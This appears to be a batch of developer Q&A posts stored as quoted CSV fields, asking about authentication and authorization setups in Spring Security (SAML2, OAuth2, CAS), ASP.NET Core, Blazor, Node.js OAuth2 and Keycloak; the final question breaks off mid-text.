"<p>I have set up a login/logout to a SAML2 SSO with Spring Security. Everything is working fine, but the problem is that I can't find a way to redirect the application to a specific page after a successful logout instead of the index. I have looked at the documentation and many Stack Overflow threads, and it seems like this is how it's done:</p>
<pre><code>.saml2Login(saml2 -&gt; saml2
                        .authenticationManager(new ProviderManager(authenticationProvider))
                )
                .logout(logout -&gt; logout
                        .logoutSuccessUrl(&quot;/logoutOk&quot;))
                .saml2Logout((saml2) -&gt; saml2
                        .logoutRequest((request) -&gt; request.logoutUrl(&quot;/SLOService.saml2&quot;))
                        .logoutResponse((response) -&gt; response.logoutUrl(&quot;/SLOService.saml2&quot;))
                )
                .cors(Customizer.withDefaults())
</code></pre>
<p>, but it's not working for me. I've been stuck for days with this seemingly trivial issue.</p>
"
"<p>We use the <a href=""https://learn.microsoft.com/en-us/aspnet/core/security/authorization/resourcebased?view=aspnetcore-8.0"" rel=""nofollow noreferrer"" title=""Resource-based authorization in ASP.NET Core"">imperative authorization method</a> to secure endpoints exposing sensitive resources. A simple scenario looks like this:</p>
<pre><code>public async Task&lt;IActionResult&gt; OnGetAsync(Guid documentId)
{
    Document = _documentRepository.Find(documentId);

    if (Document == null) return new NotFoundResult();

    var authorizationResult = await _authorizationService.AuthorizeAsync(User, Document, &quot;EditPolicy&quot;);

    if (authorizationResult.Succeeded) return Page();
    else if (User.Identity.IsAuthenticated) return new ForbidResult();
    else return new ChallengeResult();
}
</code></pre>
<p>Behind the scenes the <code>_authorizationService.AuthorizeAsync</code> method call is handled by a custom AuthorizationHandler. Evaluating the AuthorizationRequirement is quite complex and involves information not known to the application. It is not possible to translate said authorization logic to other systems such as the application's datastore. Therefore it is  important to note <strong>all authorization decisions should only be handled by ASP.NET's authorization system</strong>.</p>
<p>This works fine for simple scenarios where the dataset to return is already heavily reduced upfront using other criteria. For example a HTTP GET by 'id' can only match one record. In case the endpoint returns multiple records the same can be achieved by requiring some search criteria.</p>
<pre><code>public async Task&lt;IActionResult&gt; OnGetAsync(DocumentSearchCriteria searchCriteria)
{
    foreach (var document in _documentRepository.Find(searchCriteria)) {
       var authorizationResult = await _authorizationService.AuthorizeAsync(User, document, &quot;EditPolicy&quot;);
       if (authorizationResult.Succeeded) Documents.Add(document);
    }

    return Page();
}
</code></pre>
<p>There is quite some overhead in this approach; the application datastore returns too much data and loaded in application memory. It becomes even more problematic when we cannot reduce the dataset upfront. This happens when the endpoint should return all potential matches. I am firm believer premature optimization is the root of all evil, however, we already have some instances where the initial dataset exceeds 60.000 records, it's too much. When this happens we review the code and come up with some compromise. My goal is to discover alternative techniques, ideally some generic solution that we can pose as an internal guideline for these scenarios.</p>
"
"<p>I'm trying to implement Spring Security SAML2 SSO/SLO and successfully implemented the SSO, but when I tried to follow the Spring security docs for implementing SLO I got this 405 Method Not Allowed Status.</p>
<p><a href=""https://i.stack.imgur.com/HLlpi.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/HLlpi.png"" alt=""enter image description here"" /></a></p>
<p>I tried to disable the cors and csrf but I'm still having the same problem, I also tried to exclude the <code>/logout/saml2/slo</code> in filter.</p>
<p>I tried to search this issue but I can't find any info regarding this and all I can find is they are having issue with Saml2 Response.</p>
<p>I also make sure the jks is good and the alias and password is right.</p>
<p>I'm expecting this to succeed and be able to proved SAML2 Response after.</p>
<pre class=""lang-java prettyprint-override""><code>    @Bean
    public RelyingPartyRegistrationRepository relyingPartyRegistrations() throws Exception {
        if (DomainUtil.isSSOEnabled()) {
            byte[] decodeCertBase64 = Base64.getDecoder().decode(spSigningCertificateBase64.trim());
            char[] password = &quot;REMOVED&quot;.toCharArray();
            try (InputStream inputStream = getSamlMetadataInputStream(samlMetadata);
                ByteArrayInputStream certStream = new ByteArrayInputStream(decodeCertBase64);
                FileInputStream fileInputStream = new FileInputStream(&quot;/BDO/fedlet/fedletkeystore.jks&quot;)) {

                KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());
                keyStore.load(fileInputStream, password);

                String alias = keyStore.aliases().nextElement();
                RSAPrivateKey privateKey = (RSAPrivateKey) keyStore.getKey(alias, password);

                CertificateFactory certificateFactory = CertificateFactory.getInstance(&quot;X.509&quot;);
                X509Certificate cert = (X509Certificate) certificateFactory.generateCertificate(certStream);

                Saml2X509Credential signingCredential = Saml2X509Credential.signing(privateKey, cert);

                RelyingPartyRegistration.Builder builder = RelyingPartyRegistrations.fromMetadata(inputStream)
                        .registrationId(samlRegistrationId)
                        .signingX509Credentials(signing -&gt; signing.add(signingCredential))
                        .assertingPartyDetails(details-&gt; details
                        .singleLogoutServiceBinding(Saml2MessageBinding.POST)
                        .singleLogoutServiceLocation(SAML2_LOGOUT_URL) // SAML2_LOGOUT_URL = /logout/saml2/slo, I tried to change it to {baseUrl}/logout/saml2/slo still didn't work.
                        .singleLogoutServiceResponseLocation(&quot;/logout&quot;));

                if (StringUtils.isNotBlank(samlEntityId)) {
                    builder.entityId(samlEntityId);
                }
                return new InMemoryRelyingPartyRegistrationRepository(builder.build());
            } catch (Exception e) {
                log.error(&quot;relyingPartyRegistrations() : %s&quot;.formatted(e.getMessage()), e);
                throw e;
            }
        }
        return null;
    }
</code></pre>
<p>Here is my security filter chain:</p>
<pre class=""lang-java prettyprint-override""><code>    @Bean
    @Order(3)
    SecurityFilterChain samlWebChain(HttpSecurity http, CustomUserDetailsService userDetailsServiceImp) throws Exception {
        try {
            http
                    .authorizeHttpRequests(auth -&gt; auth
                            .requestMatchers(&quot;/api/**&quot;, &quot;/error**&quot;).permitAll()
                            .requestMatchers(LOGIN_URL, SAML2_LOGOUT_URL).permitAll()
                            .requestMatchers(&quot;/accessDenied&quot;).permitAll()
                            .requestMatchers(&quot;/config/**&quot;, &quot;/common/**&quot;).authenticated()
                            .anyRequest().access(new CustomAuthorizationManager()))
                    .headers(headers -&gt; headers
                            .contentSecurityPolicy(securityPolicy -&gt; {
                                String cspUrl = FileUtil.getApplicationMingleUserActivityDomain();
                                cspUrl = cspUrl.startsWith(&quot;.&quot;) ? cspUrl.substring(1) : cspUrl;
                                securityPolicy.policyDirectives(&quot;frame-ancestors https://*.&quot; + cspUrl + &quot;:*&quot;);

                            })
                            .frameOptions(frameOptions -&gt; frameOptions.sameOrigin())
                    ).csrf(httpSecurityCsrfConfigurer -&gt; httpSecurityCsrfConfigurer.ignoringRequestMatchers(SAML2_LOGOUT_URL));
            if (DomainUtil.isSSOEnabled()) {
                http
                        .saml2Login(saml -&gt; saml
                                .authenticationManager(new Saml2UserDetailsAuthenticationManager(userDetailsServiceImp))
                                .successHandler(myAuthenticationSuccessHandler())
                        )
                        .saml2Logout(Customizer.withDefaults());
            }
            http.exceptionHandling(e -&gt; e.accessDeniedPage(&quot;/accessDenied&quot;));
            return http.build();
        } catch (Exception e) {
            log.error(&quot;samlWebChain() : %s&quot;.formatted(e.getMessage()), e);
            throw e;
        }
    }
</code></pre>
<p>I tried to add the <code>/logout/saml2/slo</code> in my controller it pass 200 status but I don't know what todo with the XML that I receive, I'm still working on this.</p>
<p>I don't know what else I can provide here, please feel free to ask if you need anymore information and I will update this.</p>
<p><strong>UPDATE</strong>: 02/22/2024</p>
<p>I included the <code>saml2metadta()</code> and download the saml metadata from <code>/saml2/metadata</code>. For some reason the SingleLogoutService is not in the file, I expected it to contain the SLO URL.</p>
<p><a href=""https://i.stack.imgur.com/8qZJL.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/8qZJL.png"" alt=""enter image description here"" /></a></p>
<p><strong>UPDATE</strong>: 02/23/2024</p>
<p>I'm able to include the missing SLO Request and Response after including the <code>{baseUrl}</code> and <code>{registrationId}</code> in siglleLogoutServiceLocation. but I'm still having the same 405 issue.</p>
<p><a href=""https://i.stack.imgur.com/dZsS9.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/dZsS9.png"" alt=""enter image description here"" /></a></p>
"
"<p>I have three applications in spring boot and the authentication is done through cas server (azure tenant). If a user logs in any of the three applications and tries to access any of the other two, I want them not to have to log in again but instead they are redirected to login page. Them problem introduced when I upgraded cas from 5.3.16 to 6.2.8. This used to work on the older version.</p>
<p>The services are loaded to cas from the following json files:</p>
<p>egate-1001.json<br />
not-1003.json<br />
sanction-1004.json</p>
<p>I'll post only one of them since they have the same structure.</p>
<p>not-1003.json:</p>
<pre><code>{
  &quot;@class&quot;: &quot;org.apereo.cas.services.RegexRegisteredService&quot;,
  &quot;serviceId&quot;: &quot;https://${ENV_EGATE_HOST}/not/.*&quot;,
  &quot;name&quot;: &quot;Notifications&quot;,
  &quot;description&quot;: &quot;eGate Notifications application&quot;,
  &quot;id&quot;: 1003,
  &quot;matchingStrategy&quot;: {
    &quot;@class&quot;: &quot;org.apereo.cas.services.FullRegexRegisteredServiceMatchingStrategy&quot;
  },
  &quot;logoutType&quot;: &quot;FRONT_CHANNEL&quot;,
  &quot;logoutUrl&quot;: &quot;https://${ENV_EGATE_HOST}/not/j_spring_cas_security_logout&quot;,
  &quot;evaluationOrder&quot;: 10000003,
  &quot;attributeReleasePolicy&quot;: {
    &quot;@class&quot;: &quot;org.apereo.cas.services.ReturnAllAttributeReleasePolicy&quot;
  }
}
</code></pre>
<p>Here is the cas.properties file.</p>
<pre><code>cas.server.name=https://${ENV_EGATE_HOST}
cas.server.prefix=${cas.server.name}/cas
server.port=8443

cas.service-registry.init-from-json=false
cas.service-registry.json.location=file:${ENV_CAS_CONFIGPATH}/services

cas.authn.pac4j.oidc[0].generic.type=AZURE
cas.authn.pac4j.oidc[0].generic.discoveryUri=https://login.microsoftonline.com/${ENV_AZURE_TENANTID}/v2.0/.well-known/openid-configuration
cas.authn.pac4j.oidc[0].generic.logoutUrl=https://login.microsoftonline.com/${ENV_AZURE_TENANTID}/oauth2/logout?post_logout_redirect_uri=https://${ENV_EGATE_HOST}/cas/
cas.authn.pac4j.oidc[0].generic.id=${ENV_AZURE_APPID}

cas.authn.pac4j.oidc[0].generic.secret=${ENV_AZURE_SECRET}

cas.authn.pac4j.oidc[0].generic.auto-redirect=false
cas.authn.pac4j.oidc[0].generic.clientName=${ENV_AZURE_APPNAME}
cas.authn.pac4j.oidc[0].generic.azureTenantId=${ENV_AZURE_TENANTID}

cas.authn.pac4j.oidc[0].generic.responseType=code
cas.authn.pac4j.oidc[0].generic.useNonce=true
cas.authn.pac4j.oidc[0].generic.scope=openid profile
cas.authn.pac4j.typedIdUsed=false
cas.view.cas2.v3ForwardCompatible=true

management.endpoints.enabled-by-default = true
management.endpoints.actuatorEndpointsEnabled = true
cas.monitor.endpoints.enabled = true
cas.monitor.endpoints.sensitive = false

cas.authn.pac4j.cookie.crypto.encryption.key=${ENV_CAS_COOKIE_ENCRYPRION_KEY}
cas.authn.pac4j.cookie.crypto.signing.key=${ENV_CAS_COOKIE_SIGNING_KEY}
cas.tgc.crypto.encryption.key=${ENV_CAS_TGC_ENCRYPTION_KEY}
cas.tgc.crypto.signing.key=${ENV_CAS_TGC_SIGNING_KEY}
cas.webflow.crypto.signing.key=${ENV_CAS_WEBFLOW_SIGNING_KEY}
cas.webflow.crypto.encryption.key=${ENV_CAS_WEBFLOW_ENCRYPTION_KEY}
</code></pre>
<p>For each application there is a spring-security.xml file. They are written according to this documentation: <a href=""https://docs.spring.io/spring-security/reference/servlet/authentication/cas.html"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-security/reference/servlet/authentication/cas.html</a></p>
<p>I tried different versions of cas from version 6 and above but it didn't work.</p>
<p>Any ideas of what could be the problem?</p>
<p>Thanks in advance.</p>
"
"<p>I'm developing a web application where I need to implement an authentication system using OAuth2. However, I'm a bit confused about how this new OAuth2 authentication service should work.</p>
<p>Obs: I'm developing this service in Node.js.</p>
<p>My current authentication service receives a username and password, and if they are valid (and are in my Users table), an access token is generated and returned to my client.</p>
<hr />
<p>The new service I'm creating has a route for authorization (/authorize), generating a code_auth for my client.
Request to /authorize:</p>
<p>Method: GET
URL: http://localhost:3013/authorize?scope=read&amp;redirect_uri=http://localhost:3014</p>
<hr />
<p>After that, I have the route to obtain the token (/token), which receives the auth_code and returns the access_token.
Request to /token:</p>
<p>Method: POST
URL: http://localhost:3007/token
Request body:</p>
<pre><code>{ 
   &quot;authorization_code&quot;: &quot;CODE_AUTH&quot;, 
   &quot;client_id&quot;: &quot;CLIENT_ID&quot;, 
   &quot;client_secret&quot;: &quot;CLIENT_SECRET&quot; 
}
</code></pre>
<hr />
<p>But since I'm new to OAuth2.0, I'm having trouble understanding where in this flow the verification of username and password that my previous service did fits in. Where in OAuth2 do I check if my user is a valid user? Is it in the /token route by passing the username and password along with the auth_code, or is it not correct to do that?</p>
"
"<p>I am writing unit test to each independent gateway filter which is extended from <code>AbstractGatewayFilterFactory</code>.</p>
<p>One such filter is <code>GraphAPIClaims</code> filter, in this filter I am extracting the principal from <code>ServerWebExchange</code> instance, getting <code>Oauth2AuthenticationToken</code> out of it, and using this to get <code>Oauth2AuthorizedClient</code> and mutating the request to add or modify request headers.</p>
<p>I have figured out ways to mock the steps to get upto <code>Oauth2AuthenticationToken</code>, but getting <code>Oauth2AuthorizedClient</code> by mocking is where I am stuck at, below is the code that performs the operation which is called in the reactive pipeline of my filter.</p>
<pre><code>private Mono&lt;OAuth2AuthorizedClient&gt; authorizedClient(ServerWebExchange exchange, OAuth2AuthenticationToken oauth2Authentication) {

        String clientRegistrationId = oauth2Authentication.getAuthorizedClientRegistrationId();
        OAuth2AuthorizeRequest request = OAuth2AuthorizeRequest.withClientRegistrationId(clientRegistrationId).principal(oauth2Authentication).build();
        ReactiveOAuth2AuthorizedClientManager clientManager = (ReactiveOAuth2AuthorizedClientManager) this.clientManagerProvider.getIfAvailable();
        return clientManager == null ?
                Mono.error(new IllegalStateException(catalog.getMessage(&quot;filter.graph.oauth2.client.manager.missing&quot;,
                        null, LocaleContextHolder.getLocale()))) :
                clientManager.authorize(request);
    }
</code></pre>
<p>Here the issue is with mocking ReactiveOAuth2AuthorizedClientManager instance, I get null pointer exception.</p>
<p>My unit test is as follows:</p>
<pre><code>@Test
    @Order(2)
    @Description(&quot;Test with no oauth2 authentication token&quot;)
    public void testWithNoOauth2AuthorizedClient()  {
        GraphApiClaimsGatewayFilterFactory.Config config = new GraphApiClaimsGatewayFilterFactory.Config();
        config.setForwards(getMappings());
        GraphApiClaimsGatewayFilterFactory graphApiClaimsGatewayFilterFactory = new graphApiClaimsGatewayFilterFactory(clientManagerProvider);
        GatewayFilter filter = graphApiClaimsGatewayFilterFactory.apply(config);
        MockServerHttpRequest request = MockServerHttpRequest.get(&quot;http://localhost&quot;)
                .header(&quot;DummyHeader&quot;,&quot;DummyValue&quot;)
                .build();
        int requestHeadersSizeBeforeFilter = request.getHeaders().size();


        OAuth2AuthorizeRequest oAuth2AuthorizeRequest = OAuth2AuthorizeRequest.withClientRegistrationId(getWebExchangePrincipal()
                .getAuthorizedClientRegistrationId())
                .principal( &quot;dummyPrincipal&quot;)
                .build();
        OAuth2AuthorizedClient oAuth2AuthorizedClient = mock(OAuth2AuthorizedClient.class);
        ReactiveOAuth2AuthorizedClientManager reactiveOAuth2AuthorizedClientManager = mock(ReactiveOAuth2AuthorizedClientManager.class);

        ServerWebExchange exchange = MockServerWebExchange.from(request).mutate().principal(Mono.just(getWebExchangePrincipal())).build();
        when(chain.filter(exchange)).thenReturn(Mono.empty());
        when(clientManagerProvider.getIfAvailable()).thenReturn(reactiveOAuth2AuthorizedClientManager);
        when(reactiveOAuth2AuthorizedClientManager.authorize(oAuth2AuthorizeRequest)).thenReturn(Mono.just(oAuth2AuthorizedClient));
        filter.filter(exchange,chain).subscribe();

        Set&lt;String&gt; filteredHeaders = exchange.getRequest().getHeaders().keySet();
        int requestHeadersSizeAfterFilter = filteredHeaders.size();

        assert requestHeadersSizeBeforeFilter == requestHeadersSizeAfterFilter;

    }
</code></pre>
"
"<p>We have an application which uses spring security saml for SSO authentication for a client.
We needed to add a new SSO authentication for our internal users on the login page, so user_client need to click on sso_login_client button to be redirected on its IdP to log in, and user_internal on sso_login_internal button to be redirected on our IdP.</p>
<p>The problem is that our configuration is implemented for only one IdP. What do we need to change to support another IdP ?</p>
<p>Here is our configuration :</p>
<p>SecurityConfig.java</p>
<pre class=""lang-java prettyprint-override""><code>@EnableGlobalMethodSecurity(prePostEnabled = true)
@EnableWebSecurity
public class SecurityConfig {
    
    @Configuration
    @Order(1)
    @Profile(&quot;SSO&quot;)
    public static class WebSecurityConfig extends WebSecurityConfigurerAdapter implements InitializingBean, DisposableBean {
       
        private static final Logger logger = Logger.getLogger(SecurityConfig.class);
        private Timer backgroundTaskTimer;
        private MultiThreadedHttpConnectionManager multiThreadedHttpConnectionManager;
        
        private String metadataUrl = null;
        private String entityID = null;
        private String entityBaseURL = null;
        private String metadataFile = null;
        private String metadataRetrievalMode = null;
        private Long maxAuthenticationAge = null;
        
    ...
     
        // SAML Authentication Provider responsible for validating of received SAML
        // messages
        @Bean
        public CustomSamlAuthenticationProvider samlAuthenticationProvider() {
            CustomSamlAuthenticationProvider customSamlAuthenticationProvider = new CustomSamlAuthenticationProvider();
            customSamlAuthenticationProvider.setForcePrincipalAsString(false);
            return customSamlAuthenticationProvider;
        }
     
    ...
        
        // Setup advanced info about metadata
        @Bean
        public ExtendedMetadata extendedMetadata() {
                ExtendedMetadata extendedMetadata = new ExtendedMetadata();
                extendedMetadata.setIdpDiscoveryEnabled(false); 
                extendedMetadata.setSignMetadata(false);
                extendedMetadata.setEcpEnabled(true);
                return extendedMetadata;
        }
        
        
        @Bean
        @Qualifier(&quot;idp-adfs&quot;)
        public ExtendedMetadataDelegate adfsExtendedMetadataProvider()
                throws MetadataProviderException {
            ExtendedMetadataDelegate extendedMetadataDelegate = null;
            
            if (&quot;FILE&quot;.equals(metadataRetrievalMode)) {
                   FilesystemMetadataProvider fileSystemMetadataProvider = new FilesystemMetadataProvider(new File(metadataFile));
                    fileSystemMetadataProvider.setParserPool(parserPool());
                    
                    extendedMetadataDelegate = new ExtendedMetadataDelegate(fileSystemMetadataProvider, extendedMetadata());
                    extendedMetadataDelegate.setMetadataTrustCheck(false);
                    extendedMetadataDelegate.setMetadataRequireSignature(false);
            } else {
                 String idpKeycloakMetadataURL = metadataUrl;
                 HTTPMetadataProvider httpMetadataProvider = new HTTPMetadataProvider(
                            this.backgroundTaskTimer, httpClient(), idpKeycloakMetadataURL);
                httpMetadataProvider.setParserPool(parserPool());
                
                extendedMetadataDelegate = new ExtendedMetadataDelegate(httpMetadataProvider, extendedMetadata());
                // Disable metadata trust check to prevent &quot;Signature trust establishment failed for metadata entry&quot; exception
                extendedMetadataDelegate.setMetadataTrustCheck(false);
                extendedMetadataDelegate.setMetadataRequireSignature(false);
            }
            
            backgroundTaskTimer.purge();
            return extendedMetadataDelegate;
        }

        // IDP Metadata configuration - paths to metadata of IDPs in circle of trust
        // is here
        // Do no forget to call iniitalize method on providers
        @Bean
        @Qualifier(&quot;metadata&quot;)
        public CachingMetadataManager metadata() throws MetadataProviderException {
            
              List&lt;MetadataProvider&gt; providers = new ArrayList&lt;MetadataProvider&gt;();
                providers.add(adfsExtendedMetadataProvider());
                CachingMetadataManager metadataManager=new CachingMetadataManager(providers);
                metadataManager.setDefaultIDP(metadataUrl);
                return new CachingMetadataManager(providers);
        }
     
        // Filter automatically generates default SP metadata
        @Bean
        public MetadataGenerator metadataGenerator() {
            MetadataGenerator metadataGenerator = new MetadataGenerator();
            metadataGenerator.setEntityId(entityID);
            if (entityBaseURL != null) {
                metadataGenerator.setEntityBaseURL(entityBaseURL);
            }
            metadataGenerator.setExtendedMetadata(extendedMetadata());
            metadataGenerator.setIncludeDiscoveryExtension(false);
            metadataGenerator.setKeyManager(keyManager()); 
            metadataGenerator.setRequestSigned(false);
            return metadataGenerator;
        }
     

    ...
         
        @Bean
        public SAMLWebSSOHoKProcessingFilter samlWebSSOHoKProcessingFilter() throws Exception {
            SAMLWebSSOHoKProcessingFilter samlWebSSOHoKProcessingFilter = new SAMLWebSSOHoKProcessingFilter();
            samlWebSSOHoKProcessingFilter.setAuthenticationSuccessHandler(successRedirectHandler());
            samlWebSSOHoKProcessingFilter.setAuthenticationManager(authenticationManager());
            samlWebSSOHoKProcessingFilter.setAuthenticationFailureHandler(authenticationFailureHandler());
            return samlWebSSOHoKProcessingFilter;
        }
        
        // Processing filter for WebSSO profile messages
        @Bean
        public SAMLProcessingFilter samlWebSSOProcessingFilter() throws Exception {
            SAMLProcessingFilter samlWebSSOProcessingFilter = new CustomSamlProcessingFilter();
            samlWebSSOProcessingFilter.setAuthenticationManager(authenticationManager());
            samlWebSSOProcessingFilter.setAuthenticationSuccessHandler(successRedirectHandler());
            samlWebSSOProcessingFilter.setAuthenticationFailureHandler(authenticationFailureHandler());
            return samlWebSSOProcessingFilter;
        }
         
        @Bean
        public MetadataGeneratorFilter metadataGeneratorFilter() {
            return new MetadataGeneratorFilter(metadataGenerator());
        }
    
        @Override  
        protected void configure(HttpSecurity http) throws Exception {
            http.csrf().disable();
            http
                .httpBasic()
                    .authenticationEntryPoint(samlEntryPoint());      
            http
                    .addFilterBefore(metadataGeneratorFilter(), ChannelProcessingFilter.class)
                    .addFilterAfter(samlFilter(),BasicAuthenticationFilter.class)
                    .addFilterBefore(samlFilter(), CsrfFilter.class);
            http .requestMatchers()        
                .antMatchers(&quot;/loginSSO/**&quot;,&quot;/saml/**&quot;).and().authorizeRequests()
                    .anyRequest().authenticated();
            http
                    .logout()
                    .disable(); // The logout procedure is already handled by SAML filters.
            
        }
     
        
        @Override
        protected void configure(AuthenticationManagerBuilder auth) throws Exception {
            auth
                .authenticationProvider(samlAuthenticationProvider());
        }
        
    }
}
</code></pre>
<p>LoginSSOController.java</p>
<pre class=""lang-java prettyprint-override""><code>@Controller
public class LoginSSOController {
    
    // Logger
        private static final Logger logger = Logger.getLogger(LoginSSOController.class);

        @RequestMapping(value = &quot;/loginSSO&quot;, method = RequestMethod.GET)
        public View idpSelection(HttpServletRequest request, Model model) {
            Authentication auth = SecurityContextHolder.getContext().getAuthentication();
            if (auth == null) {
                logger.debug(&quot;Current authentication instance from security context is null&quot;);
            }else {
                logger.debug(&quot;Current authentication instance from security context: &quot;);
            }
            if (auth == null) {
                RedirectView redirect = new RedirectView(&quot;/login&quot;);
                redirect.setExposeModelAttributes(false);
                return redirect;
            }
            RedirectView redirect = new RedirectView(&quot;/dashboard&quot;);
            redirect.setExposeModelAttributes(false);
            return redirect;
        }
}
</code></pre>
<p>login.html</p>
<pre class=""lang-html prettyprint-override""><code>&lt;a href=&quot;/loginSSO&quot; class=&quot;logAD btn&quot;&gt;&lt;i class=&quot;fa fa-windows&quot;&gt;
    &lt;/i&gt; &lt;span th:text=&quot;${loginPageSSOLabel}&quot;&gt;Login with SSO&lt;/span&gt;
&lt;/a&gt;
</code></pre>
<p>I heard about RelyingPartyRegistration but i don't know if it's the right solution for our configuration and how to implement it.</p>
<p>Also i am wondering how does spring-security distinguish multiple IdPs for different users ? Do we need to create a new endpoint like &quot;/loginSSO&quot; ?</p>
<p>Thank you for your help in advance.</p>
"
"<p>I have big problems in using AuthenticationState in Blazor 8.0 Wasm (Hosted).
The problem is that after I log in, the AuthenticationState is not refreshed and the DefaultAuthorizationService.Authorize method gets old ClaimPrincipal data.</p>
<p>All the services are registered in DI container.</p>
<p>I have implemented custom AuthenticationStateProvider like this:</p>
<pre><code>public class PersistentAuthenticationStateProvider : AuthenticationStateProvider
{
    private readonly UserInfoProvider _userInfoProvider;
    private readonly ILogger&lt;PersistentAuthenticationStateProvider&gt; _logger;
    private ClaimsPrincipal UnauthorizedPrincipal =&gt; new ClaimsPrincipal(new 
            ClaimsIdentity(new List&lt;Claim&gt;(){new Claim(ClaimTypes.Name, &quot;Anonymous&quot;)}));

    public PersistentAuthenticationStateProvider(UserInfoProvider userInfoProvider, 
           ILogger&lt;PersistentAuthenticationStateProvider&gt; logger)
    {
        _userInfoProvider = userInfoProvider;
        _logger = logger;
    }

    public override Task&lt;AuthenticationState&gt; GetAuthenticationStateAsync()
    {
        var claimsPrincipal = UnauthorizedPrincipal;
        var info = _userInfoProvider.GetCurrentUserInfo();
        if (info != null)
        {
            claimsPrincipal = new ClaimsPrincipal(new ClaimsIdentity(
                info.UserClaims.Select(x =&gt; new Claim(x.ClaimType, x.ClaimValue)),
                authenticationType: &quot;PersistentAuthenticationStateProvider&quot;));
        }

        var stateTask = Task.FromResult(new AuthenticationState(claimsPrincipal));
        return stateTask;
    }

    public void NotifyUserHasChanged()
    {
        NotifyAuthenticationStateChanged(GetAuthenticationStateAsync());
    }
}
</code></pre>
<p>On User login I call NotifyUserHasChanged() method on an instance of PersistentAuthenticationStateProvider, but nothing happens.</p>
<p>I have put a breakpoint in the AuthorizeView.OnParameterSetAsync where it is getting the AuthenticationState, and this method is not executed when NotifyAuthenticationStateChanged is called.</p>
<p>My workflow for user authentication is:</p>
<ol>
<li>At the startup, the framework checks if the user is logged in, if not, it will redirect to LoginPage</li>
<li>User enters username and password and tries to login</li>
<li>This makes a Rest request to the api endpoint and returns token. This token is saved in local storage.</li>
<li>Then I make a request to get UserInfo containing user claims.</li>
<li>If this success, i store it into local storage and NotifyAuthenticationStateChanged.</li>
<li>I use NavigationManager to navigate to HomePAge that has [Authorize] attribute.</li>
<li>The framework calls AuthorizeView.OnParameterSetAsync() and there is a call to await AuthenticationState, this state returns old data.</li>
</ol>
<p>But if I close the browser and restart it, it will find the user data stored in localstorage and the user will correctly be authorized.</p>
<p>Also if i log-out the user, I clear up the local storage and NotifyAuthenticationStateChanged, it will correctly be unauthorized.</p>
<p><strong>NOTE: It works if I navigate using &quot;forceLoad:true&quot;</strong></p>
<p>I need help to find what I'm doing wrong?
Please help</p>
<p>Thanks</p>
"
"<p>We have a very complex authorization rules in our product. Due to this we rely heavily on a custom <code>AuthorizationHandler</code> pipeline within the .NET framework.</p>
<p>One problem we have right now is that we need to provide custom logic that will differ per endpoint in addition to already implemented <code>AuthorizationHandler</code>.</p>
<p>From reading documentation on:</p>
<ol>
<li><a href=""https://learn.microsoft.com/en-us/aspnet/core/security/authorization/iauthorizationpolicyprovider?view=aspnetcore-8.0"" rel=""nofollow noreferrer"">https://learn.microsoft.com/en-us/aspnet/core/security/authorization/iauthorizationpolicyprovider?view=aspnetcore-8.0</a></li>
<li><a href=""https://learn.microsoft.com/en-us/aspnet/core/security/authorization/customizingauthorizationmiddlewareresponse?view=aspnetcore-8.0"" rel=""nofollow noreferrer"">https://learn.microsoft.com/en-us/aspnet/core/security/authorization/customizingauthorizationmiddlewareresponse?view=aspnetcore-8.0</a></li>
<li><a href=""https://learn.microsoft.com/en-us/aspnet/core/security/authorization/dependencyinjection?view=aspnetcore-8.0"" rel=""nofollow noreferrer"">https://learn.microsoft.com/en-us/aspnet/core/security/authorization/dependencyinjection?view=aspnetcore-8.0</a></li>
</ol>
<p>We are already using a custom <code>AuthorizationHandler</code> in combination with a custom 'PolicyProvider'. The custom authorization middleware is dealing with already executed response, so it is too late to perform any additional checks there.</p>
<p>The problem begins where we need to provide custom implementation in addition to existing custom <code>AuthorizationHandler</code> we have. Is there a way to provide an interface from an attribute or somehow pipe into authorization flow from <code>[Authorize]</code> attribute? where we can provide an interface or something to be able to get instance from DI container?</p>
"
"<p>I have an spring boot application for OAuth2 login and Okta as Auth server. below code is running fine.
If I try to access secured url, spring redirects to  /oauth2/authorization/{registrationId} for authorization code grant flow.</p>
<p>Spring Security version - 5.7.3
Spring Oauth 2  - 5.7.8</p>
<p>@Override
protected void configure(HttpSecurity http) throws Exception {
http
.authorizeRequests()
.antMatchers(&quot;/&quot;, &quot;/img/**&quot;,&quot;/error&quot;, &quot;/status&quot;)
.permitAll()
.anyRequest()
.fullyAuthenticated();</p>
<pre><code>        http
            .oauth2Login()
            .authorizationEndpoint()
            .authorizationRequestResolver(new CustomAuthorizationRequestResolver(
                clientRegistrationRepository, DEFAULT_AUTHORIZATION_REQUEST_BASE_URI
            ));

        http.oauth2Login().redirectionEndpoint().baseUri(REDIRECT_PATH);
        http.oauth2Login().userInfoEndpoint().oidcUserService(this.oidcUserService());

}
</code></pre>
<p>But as my project is xml based (not annotaion based) so converted above code in spring xml as below :</p>
<pre><code>       &lt;security:intercept-url pattern=&quot;/&quot; access=&quot;permitAll&quot; /&gt;
       &lt;security:intercept-url pattern=&quot;/img/**&quot; access=&quot;permitAll&quot; /&gt;
       &lt;security:intercept-url pattern=&quot;/error&quot; access=&quot;permitAll&quot; /&gt;
       &lt;security:intercept-url pattern=&quot;/status&quot; access=&quot;permitAll&quot; /&gt;
       &lt;security:intercept-url pattern=&quot;/**&quot; access=&quot;isFullyAuthenticated&quot; /&gt;

    &lt;security:oauth2-login
        client-registration-repository-ref=&quot;clientRegistrationRepository&quot;
        authorization-request-resolver-ref=&quot;customAuthorizationRequestResolver&quot;
        oidc-user-service-ref=&quot;oidcUserService&quot;
        login-processing-url=&quot;/callback&quot;
        jwt-decoder-factory-ref=&quot;jwtDecoderFactory&quot; 
        /&gt; 
</code></pre>
<p>I provided all required beans above.</p>
<p><strong>Problem with XML :</strong> If I try to access secured url, it is not redirecting to /oauth2/authorization/{registrationId} and because of this Auth server (Okta) login not coming up.
So i stuck there.</p>
<p>Any help would be appreciated.</p>
<p>Thanks in advance.</p>
"
"<p>I am trying to connect a Vaadin frontend to a backend API with Keycloak as a centralized authorization server.</p>
<p>Currently I have an API-Service written in FastAPI which can be used to submit data and receive the results of an analysis for it after the data has been processed. The results are stored in different database schemas per tenant/usergroup.
This API should be used to integrate the service in many ways, e.g other applications.</p>
<p>Now I want to provide a user interface with Vaadin so that my APIs functionality is easier to use for non-technical users. I would like to allow a login to the application with the credentials stored in Keycloak.
